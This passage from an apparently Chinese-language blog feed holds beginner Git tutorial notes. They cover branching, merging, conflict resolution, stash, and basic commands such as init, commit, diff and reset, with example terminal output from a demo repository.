<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c front</span></span><br><span class="line">Switched to a new branch 'front'</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>-c</code>代表新建一个分支 <code>switch</code>代表切换分支</p>
</blockquote>
<p>确保当前所在分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* front</span><br><span class="line">  master</span><br></pre></td></tr></table></figure>

<p>在该分支下新建我们的文件<code>front.txt</code>，并提交</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> touch front.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add front.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"new front branch"</span></span></span><br></pre></td></tr></table></figure>

<p>我们再转回主分支<code>master</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p>此时我们会发现我们之前新建的<code>front.txt</code>文件不见了，这是因为该文件是在<code>front</code>分支下提交的，此时的前端分支比我们的主分支“提前”。</p>
<p>同样的方法新建一个接口分支并加一个文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c interface</span></span><br><span class="line">Switched to a new branch 'interface'</span><br><span class="line"><span class="meta">$</span><span class="bash"> touch interface.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add interface.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"new interface branch"</span></span></span><br><span class="line">[interface 824a607] new interface branch</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 interface.txt</span><br><span class="line"><span class="meta"> $</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p>此时仓库情况如图：</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio3.png" alt></p>
<h3 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h3><p>两边的人员工作都做完了，就可以考虑合并了，毕竟一直单干啥事都干不了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge front</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge interface</span></span><br></pre></td></tr></table></figure>

<p>意思是依次将当前分支（即<code>master</code>）合并到目标分支，我们尝试合并第二个时可能会遇到下面的情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Merge branch 'interface'</span><br><span class="line"><span class="meta">#</span><span class="bash"> Please enter a commit message to explain why this merge is necessary,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> especially <span class="keyword">if</span> it merges an updated upstream into a topic branch.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Lines starting with <span class="string">'#'</span> will be ignored, and an empty message aborts</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> the commit.</span></span><br></pre></td></tr></table></figure>

<p>意思是说希望我们能够给出合理的解释，为什么要合并这两个分支，我们可以直接关闭（ 按键盘左上角<code>Esc</code>，输入<code>:wq</code>即可退出）也可以写入一些信息（ 按键盘字母 <code>i</code> 进入<code>insert</code>模式并输入说明然后关闭 ）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">merge front and interface</span><br></pre></td></tr></table></figure>

<p>然后我们的当前主分支下就会出现<code>front.txt</code>和<code>interface.txt</code>两个文件了。</p>
<h3 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h3><p>我们合并好分支后，对于不需要的分支可以删除，不会对我们目前的分支产生影响，因为我们当前的主分支比两个分支都“提前”，<strong>删除实际上删除的是指针</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d front</span></span><br><span class="line">Deleted branch front (was 0c93a6f).</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch -d interface</span></span><br><span class="line">Deleted branch interface (was 824a607).</span><br><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br><span class="line">* master</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line">commit 844e6a7ef9d46e3386bb0e18fecef93121f1831c (HEAD -&gt; master)</span><br><span class="line">Merge: 0c93a6f 824a607</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 15:03:51 2022 +0800</span><br><span class="line"></span><br><span class="line">    merge front and interface</span><br><span class="line"></span><br><span class="line">commit 824a60792b798f2ae9dfb55859142c41773573ad</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 14:45:35 2022 +0800</span><br><span class="line"></span><br><span class="line">    new interface branch</span><br><span class="line"></span><br><span class="line">commit 0c93a6f1f8ca2c884040437b3568514518ffbb7a</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 14:37:57 2022 +0800</span><br><span class="line"></span><br><span class="line">    new front branch</span><br><span class="line">:</span><br></pre></td></tr></table></figure>

<p>可以发现我们的提交都没有丢失</p>
<h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><p>当然了合并也不是每一次都能愉快地进行，不然前后端之间的矛盾也不会有这么多了。</p>
<p>假如前端说<code>JavaScript</code>是世界上最好的语言！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c front</span></span><br><span class="line">Switched to a new branch 'front'</span><br></pre></td></tr></table></figure>

<p>新建<code>lan.txt</code>文件并在文件中输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`JavaScript`是世界上最好的语言！</span><br></pre></td></tr></table></figure>

<p>然后提交</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line">warning: LF will be replaced by CRLF in lan.txt.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"最好的语言"</span></span></span><br><span class="line">[front 2ba9fe4] 最好的语言</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 lan.txt</span><br></pre></td></tr></table></figure>

<p>而后端的人却说<code>Java</code>是世界上最好的语言！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br></pre></td></tr></table></figure>

<p>新建<code>lan.txt</code>文件并在文件中输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`Java`是世界上最好的语言！</span><br></pre></td></tr></table></figure>

<p>然后提交</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line">warning: LF will be replaced by CRLF in lan.txt.</span><br><span class="line">The file will have its original line endings in your working directory</span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"最好的语言"</span></span></span><br><span class="line">[master 8ee9862] 最好的语言</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 lan.txt</span><br></pre></td></tr></table></figure>

<p>然后尝试合并</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge front</span></span><br><span class="line">Auto-merging lan.txt</span><br><span class="line">CONFLICT (add/add): Merge conflict in lan.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure>

<p>这可把<code>Git</code>难住了，不同的分支对同一文件有不同的修改方式，<code>Git</code>尽最大能力也无法将其合并，现在只能我们自己手动合并冲突了。</p>
<p>我们打开<code>lan.txt</code>文件可以发现</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat lan.txt</span></span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">`Java`是世界上最好的语言！</span><br><span class="line">=======</span><br><span class="line">`JavaScript`是世界上最好的语言！</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;&gt;&gt;&gt;&gt; front</span></span><br></pre></td></tr></table></figure>

<p>上面表明<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>和<code>=======</code>之间的是当前分支的内容，<code>=======</code>和<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>之间的是<code>front</code>分支的内容，我们手动将其改成</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">自然语言是世界上最好的语言！</span><br></pre></td></tr></table></figure>

<p>然后提交</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"你们俩别吵了"</span></span></span><br><span class="line">[master 7cec3a6] 你们俩别吵了</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br><span class="line">commit 7cec3a623357cbea756a12235a995df2f85d6eed (HEAD -&gt; master)</span><br><span class="line">Merge: 8ee9862 2ba9fe4</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 16:06:57 2022 +0800</span><br><span class="line"></span><br><span class="line">    你们俩别吵了</span><br><span class="line"></span><br><span class="line">commit 8ee98627480b081d1885f8adcb7aad9580c2910c</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 15:55:50 2022 +0800</span><br><span class="line"></span><br><span class="line">    最好的语言</span><br><span class="line"></span><br><span class="line">commit 2ba9fe41d1379e4d57077f6d76ba7ed7e4ec55cd (front)</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Wed Feb 9 15:51:01 2022 +0800</span><br><span class="line"></span><br><span class="line">    最好的语言</span><br></pre></td></tr></table></figure>

<h2 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h2><h3 id="开发分支"><a href="#开发分支" class="headerlink" title="开发分支"></a>开发分支</h3><p> 通常，合并分支时，如果没有冲突，并且分支是单向一条线路继承下来的，git会使用 <code>fast forword</code>模式，但是有些快速合并不能成功，但是又没有冲突时，就会触发分支管理策略，<code>Git</code>会自动做一次新的提交。 </p>
<p>当然我们也可以手动强制禁用<code>Fast forward</code>模式，<code>Git</code>就会在<code>merge</code>时生成一个新的<code>commit</code>.</p>
<p>我们来看一下区别：</p>
<p>首先新建一个分支并修改<code>lan.txt</code>，然后使用<strong>默认方式</strong>合并</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c default</span></span><br><span class="line">Switched to a new branch 'default'</span><br><span class="line">修改lan.txt文件</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"default commit"</span></span></span><br><span class="line">[default e167bc0] default commit</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge default</span></span><br><span class="line">Updating 7cec3a6..e167bc0</span><br><span class="line">Fast-forward</span><br><span class="line"> lan.txt | 2 +-</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure>

<p>我们再查看提交情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --pretty=oneline --abbrev-commit --graph</span></span><br><span class="line">* e167bc0 (HEAD -&gt; master, default) default commit</span><br><span class="line">*   7cec3a6 你们俩别吵了</span><br><span class="line">|\</span><br><span class="line">| * 2ba9fe4 最好的语言</span><br><span class="line">* | 8ee9862 最好的语言</span><br><span class="line">|/</span><br><span class="line">*   844e6a7 merge front and interface</span><br><span class="line">|\</span><br><span class="line">| * 824a607 new interface branch</span><br><span class="line">* | 0c93a6f new front branch</span><br><span class="line">|/</span><br><span class="line">* dcfdaa2 3</span><br><span class="line">* e54198e second commit</span><br><span class="line">* bbe2a77 first commit</span><br></pre></td></tr></table></figure>

<p>合并情况如图所示</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio4.png" alt></p>
<p>让我们再来个禁用<code>Fast forward</code>模式的合并</p>
<p>新建一个分支并修改<code>lan.txt</code>，然后使用<strong>禁用<code>Fast forward</code>模式</strong>合并</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c noFast</span></span><br><span class="line">Switched to a new branch 'noFast'</span><br><span class="line">修改lan.txt文件</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"noFast commit"</span></span></span><br><span class="line">[noFast f7f1ef6] noFast commit</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch master</span></span><br><span class="line">Switched to branch 'master'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge by no-ff"</span> noFast</span></span><br><span class="line">Merge made by the 'ort' strategy.</span><br><span class="line"> lan.txt | 3 ++-</span><br><span class="line"> 1 file changed, 2 insertions(+), 1 deletion(-)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --pretty=oneline --abbrev-commit --graph</span></span><br><span class="line">*   274515d (HEAD -&gt; master) merge by no-ff</span><br><span class="line">|\</span><br><span class="line">| * f7f1ef6 (noFast) noFast commit</span><br><span class="line">|/</span><br><span class="line">* e167bc0 (default) default commit</span><br><span class="line">*   7cec3a6 你们俩别吵了</span><br><span class="line">|\</span><br><span class="line">| * 2ba9fe4 最好的语言</span><br><span class="line">* | 8ee9862 最好的语言</span><br><span class="line">|/</span><br><span class="line">*   844e6a7 merge front and interface</span><br><span class="line">|\</span><br><span class="line">| * 824a607 new interface branch</span><br><span class="line">* | 0c93a6f new front branch</span><br><span class="line">|/</span><br><span class="line">* dcfdaa2 3</span><br><span class="line">* e54198e second commit</span><br><span class="line">* bbe2a77 first commit</span><br></pre></td></tr></table></figure>

<p>合并情况如图所示</p>
<p><img src="https://qiniu.yalexin.top/branch.drawio5.png" alt></p>
<p>即会<strong>自动提交一次</strong>。</p>
<p>有了上述清晰的认识以后，我们以后在日常使用<code>Git</code>开发的时候应该要秉承在<code>master</code>尽量少提交的理念，即尽可能稳定，最好只用来发布版本，然后在分支<code>dev</code>上进行日常开发，每逢大版本更新的时候再把它合并到主分支上面；当然了，在分工明确的前提下，每个人应该至少有属于自己的分支，然后定期合并到<code>dev</code>。</p>
<h3 id="临时分支"><a href="#临时分支" class="headerlink" title="临时分支"></a>临时分支</h3><p>前面讲到版本库的两条主要分支：<code>master</code>和<code>dev</code>。前者用于正式发布，后者用于日常开发。其实，常设分支只需要这两条就够了，不需要其他了。</p>
<p>但是，除了常设分支以外，还有一些临时性分支，用于应对一些特定目的的版本开发。临时性分支主要有三种：</p>
<ul>
<li>功能（<code>feature</code>）分支</li>
<li>预发布（<code>release</code>）分支</li>
<li>修补bug（<code>fixbug</code>）分支</li>
</ul>
<p>这三种分支都属于临时性需要，使用完以后，应该删除，使得代码库的常设分支始终只有<code>master</code>和<code>dev</code>。</p>
<h4 id="功能分支"><a href="#功能分支" class="headerlink" title="功能分支"></a>功能分支</h4><p> 它是为了开发某种特定功能，从<code>dev</code>分支上面分出来的，开发完成后，要再并入<code>dev</code>， 功能分支的名字，可以采用<code>feature-name</code>的形式命名。 </p>
<h4 id="预发布分支"><a href="#预发布分支" class="headerlink" title="预发布分支"></a>预发布分支</h4><p>预发布分支，它是指发布正式版本之前（即合并到<code>master</code>分支之前），我们可能需要有一个预发布的版本进行测试。预发布分支是从<code>dev</code>分支上面分出来的，预发布结束以后，必须合并进<code>dev</code>和<code>master</code>分支。它的命名，可以采用<code>release-*</code>的形式。</p>
<h4 id="修补分支"><a href="#修补分支" class="headerlink" title="修补分支"></a>修补分支</h4><p>软件正式发布以后，难免会出现<code>bug</code>。这时就需要创建一个分支，进行<code>bug</code>修补。</p>
<p>修补<code>bug</code>分支是从<code>master</code>分支上面分出来的。修补结束以后，再合并进<code>master</code>和<code>deev</code>分支。它的命名，可以采用<code>fixbug-*</code>的形式。</p>
<p>这里有一个场景，你手头上的工作还没做完，但是你接到一个比较紧急的修复任务的时候，你又不想暂时提交这半截子代码，该怎么办？</p>
<p><code>Git</code>提供了<code>stash</code>命令，它把所有未提交的修改（包括暂存的和非暂存的）都保存起来，用于后续恢复当前工作目录。 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch dev</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   front.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br><span class="line">Saved working directory and index state WIP on dev: 274515d merge by no-ff</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch dev</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p>等我们在新的分支上修复好<code>BUG</code>，并合并好分支，然后再将这个暂时的修复分支删除后，就可以切换到我们的<code>dev</code>分支上来继续我们的工作了。</p>
<p>可以看一下之前暂存的代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br><span class="line">stash@&#123;0&#125;: WIP on dev: 274515d merge by no-ff</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch dev</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p>回复我们的工作有两种方法：</p>
<ul>
<li>用<code>git stash apply</code>恢复，但是恢复后，<code>stash</code>中的内容并不删除，你需要用<code>git stash drop</code>来删除 </li>
<li>用<code>git stash pop</code>，该方法在恢复的同时把<code>stash</code>中的内容也删了： </li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br><span class="line">On branch dev</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   front.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br><span class="line">Dropped refs/stash@&#123;0&#125; (414125ba81aaed29ef4736209c257077fb277202)</span><br></pre></td></tr></table></figure>

<p>然后我们就可以继续愉快地进行我们的工作了。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之Git基本操作</title>
    <url>/2022/02/08/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BGit%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>书接上回，本文主要介绍<code>Git</code>的简单日常操作。</p>
<h2 id="创建本地仓库"><a href="#创建本地仓库" class="headerlink" title="创建本地仓库"></a>创建本地仓库</h2><p>在此之前，我们先配置以下我们的账户信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"Your Email"</span></span></span><br></pre></td></tr></table></figure>

<p>这是因为<code>Git</code>是一个分布式版本控制软件，每次的提交都需要记下提交者的信息。</p>
<a id="more"></a>

<p><code>--global</code>意思是配置的是全局用户，这样子我们就不需要每个仓库都配置用户信息了。</p>
<p>例如我的信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name "YaleXin"</span><br><span class="line">git config --global user.email "495592364@qq.com"</span><br></pre></td></tr></table></figure>

<p>然后我们首先需要一个本地仓库，在电脑合适处新建个文件夹，例如<code>demoRepository</code>，然后进入该文件夹，右键鼠标打开<code>Git Bash</code>，输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>

<p>然后该目录下就会生成一个以<code>.git</code>的隐藏文件夹，就代表着我们的本地仓库创建好了。</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p> <code>Git</code>常用的是以下 6 个命令：<code>git clone</code>、<code>git push</code>、<code>git add</code> 、<code>git commit</code>、<code>git checkout</code>、<code>git pull</code> </p>
<p>这几个命令作用如下图所示</p>
<p><img src="https://qiniu.yalexin.top/area.png" alt></p>
<p><strong>名词解释</strong></p>
<ul>
<li><code>workspace</code>：工作区</li>
<li><code>staging area</code>：暂存区/缓存区</li>
<li><code>local repository</code>：版本库或本地仓库</li>
<li><code>remote repository</code>：远程仓库</li>
</ul>
<p>暂存区工作区后面我们会更加详细介绍</p>
<h3 id="将文件加到仓库中"><a href="#将文件加到仓库中" class="headerlink" title="将文件加到仓库中"></a>将文件加到仓库中</h3><p>在我们的<code>demoRepository</code>文件夹下新建一个<code>README.md</code>文件（实际上如果你要使用<code>Git</code>管理我们的文件，则需要将文件放在仓库的目录下），然后在里边写入一些内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V1: This is a file!</span><br></pre></td></tr></table></figure>

<p>然后将该修改放到暂存区，即</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add README.md</span><br></pre></td></tr></table></figure>

<p>执行上面的命令，没有任何显示</p>
<p>然后使用<code>commit</code>命令将其加至仓库中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git commit -m "first commit"</span><br><span class="line">[master (root-commit) bbe2a77] first commit</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 README.md</span><br></pre></td></tr></table></figure>

<p><code>-m</code> 参数是加入本次提交的说明备注，最好是带有一定目的性，否则后面很多提交后你就忘记本次提交的目的了。</p>
<p>上面的回显表明有一个文件有改动，有一行插入。</p>
<p>其他一些常用命令大全</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>git init</td>
<td>初始化本地仓库</td>
<td>git clone</td>
<td>克隆仓库，即将远端仓库下载到本地</td>
</tr>
<tr>
<td>git status</td>
<td>查看仓库当前的状态</td>
<td>git diff</td>
<td>比较暂存区和工作区的差异。</td>
</tr>
<tr>
<td>git add</td>
<td>添加文件到暂存区</td>
<td>git commit</td>
<td>提交暂存区到本地仓库</td>
</tr>
<tr>
<td>git reset</td>
<td>回退版本</td>
<td>git rm</td>
<td>删除工作区文件</td>
</tr>
<tr>
<td>git mv</td>
<td>移动或重命名工作区文件</td>
<td>git log</td>
<td>查看历史提交记录</td>
</tr>
<tr>
<td>git blame</td>
<td>以列表形式查看指定文件的历史修改记录</td>
<td>git remote</td>
<td>远程仓库操作</td>
</tr>
<tr>
<td>git fetch</td>
<td>从远程获取代码库</td>
<td>git pull</td>
<td>下载远程代码并合并</td>
</tr>
<tr>
<td>git push</td>
<td>上传远程代码并合并</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><p>上面是一个将文件加入到仓库中简单的步骤，下面我们进行更加详细的步骤</p>
<p>我们再在<code>README.md</code>文件中加入新内容(增加一行)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V2：This is the second write</span><br></pre></td></tr></table></figure>

<p>输入命令<code>git staatus</code>查看当前仓库状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   README.md</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br></pre></td></tr></table></figure>

<p>大概意思是说有个文件修改过了。当然我们也可以使用<code>diff</code>命令查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git diff README.md</span><br><span class="line">diff --git a/README.md b/README.md</span><br><span class="line">index 28b620b..48f320f 100644</span><br><span class="line">--- a/README.md</span><br><span class="line">+++ b/README.md</span><br><span class="line">@@ -1 +1,3 @@</span><br><span class="line">-V1: This is a file!</span><br><span class="line">\ No newline at end of file</span><br><span class="line">+V1: This is a file!</span><br><span class="line">+</span><br><span class="line">+V2：This is the second write</span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure>

<p>该命令可以更加清晰地知道改动了哪里。</p>
<p>然后我们将它们加到仓库中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git add .</span><br><span class="line"></span><br><span class="line">E:\MyBlog\demoRepository&gt;git commit -m "second commit"</span><br><span class="line">[master e54198e] second commit</span><br><span class="line"> 1 file changed, 3 insertions(+), 1 deletion(-)</span><br><span class="line"></span><br><span class="line">E:\MyBlog\demoRepository&gt;git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<h3 id="切换到指定版本"><a href="#切换到指定版本" class="headerlink" title="切换到指定版本"></a>切换到指定版本</h3><p>我突然发现，我的文件里边写错了个单词<code>write</code>，应该是<code>writing</code>，当然你可以直接从文件下手，直接修改源文件，可是现在是一个文件，当然知道要怎么改，有的时候我们可能需要的是返回到上一次副本状态，即我们的<code>V1</code>版本，则该如何？</p>
<p>我们可以借助<code>git log</code>命令查看提交记录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git log</span><br><span class="line">commit e54198ebb4e69baf5ea92eb75546b1dede044c52 (HEAD -&gt; master)</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Tue Feb 8 20:07:55 2022 +0800</span><br><span class="line"></span><br><span class="line">    second commit</span><br><span class="line"></span><br><span class="line">commit bbe2a77f4df4b447e42b53c81f02eb2e07c8c774</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Tue Feb 8 18:20:39 2022 +0800</span><br><span class="line"></span><br><span class="line">    first commit</span><br></pre></td></tr></table></figure>

<p>可以看到每一次的<code>commit</code>都对应一个哈希值。我们还发现最新的版本旁边还加了一个<code>HEAD</code>,表明这个是当前版本，上一个版本是<code>HEAD^</code>，上上个版本是<code>HEAD^^</code>，往上91个版本呢，总不可能91个<code>^</code>吧，<code>Git</code>早就为你想好啦！用<code>HEAD~91</code>即可。</p>
<p>我们使用<code>reset</code>命令即可实现去到某个版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^</span></span><br><span class="line">HEAD is now at bbe2a77 first commit</span><br></pre></td></tr></table></figure>

<p>现在打开我们的<code>README.md</code>文件，文件内容果然变成了之前的版本，理论上说，只要我们记得每一次<code>commit</code>对应的哈希值，我们就可以在任意版本之间转换，例如，我们之前第二次的版本是<code>second commit</code>，对应的哈希值是<code>e54198ebb4e69baf5ea92eb75546b1dede044c52</code></p>
<blockquote>
<p>不过需要注意的是，版本回退以后，比当前版本“新”的提交记录是无法看得到的，即此时如果使用<code>git log</code>命令时我们会发现只有第一次的提交记录了</p>
</blockquote>
<p>我们继续使用<code>reset</code>命令进行版本切换，例如切换到第二次提交状态：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard e54198ebb4e69baf5ea92eb75546b1dede044c52</span></span><br><span class="line">HEAD is now at e54198e second commit</span><br></pre></td></tr></table></figure>

<p>现在打开我们的<code>README.md</code>文件，文件内容果然变回了两行内容。</p>
<p><strong>我突然发现我想回退版本不就是为了改单词吗，可是怎么又跳回来了？？算了算了，直接修改文件吧，又不是不能！</strong></p>
<p>将第二行改成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V3：This is the third writing</span><br></pre></td></tr></table></figure>

<p>顺便把修改后的文件加到仓库中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m "3"</span><br></pre></td></tr></table></figure>

<p><code>add .</code>是将当前文件夹下的修改都加 到暂存区。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之Git的初体验</title>
